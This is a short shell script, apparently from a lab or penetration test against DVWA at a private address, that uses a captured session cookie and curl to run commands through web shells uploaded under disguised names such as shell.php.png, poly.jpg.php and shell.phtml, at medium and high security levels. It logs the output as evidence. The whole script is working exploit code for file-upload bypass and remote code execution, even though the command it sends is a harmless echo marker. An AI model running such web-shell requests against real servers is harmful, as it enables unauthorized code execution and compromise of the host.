CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed'
B='http://10.31.0.87:3000'
mkdir -p evidence/upload

echo "== medium poly.jpg.php exec:"
curl -s -b "$CK; security=medium" "$B/hackable/uploads/poly.jpg.php?c=echo+AEGIS_CODE_EXEC" | tee evidence/upload/exec-poly-jpg-php.txt
echo; echo "== medium shell.php.png exec:"
curl -s -b "$CK; security=medium" "$B/hackable/uploads/shell.php.png?c=echo+AEGIS_CODE_EXEC" | tee evidence/upload/exec-shell-php-png.txt
echo; echo "== medium shell.phtml exec:"
curl -s -b "$CK; security=medium" "$B/hackable/uploads/shell.phtml?c=echo+AEGIS_CODE_EXEC" | tee evidence/upload/exec-shell-phtml.txt
echo; echo "== high shell.php.png:"
curl -s -b "$CK; security=high" "$B/hackable/uploads/shell.php.png?c=echo+AEGIS_CODE_EXEC" | tee evidence/upload/exec-high-shell-php-png.txt
echo
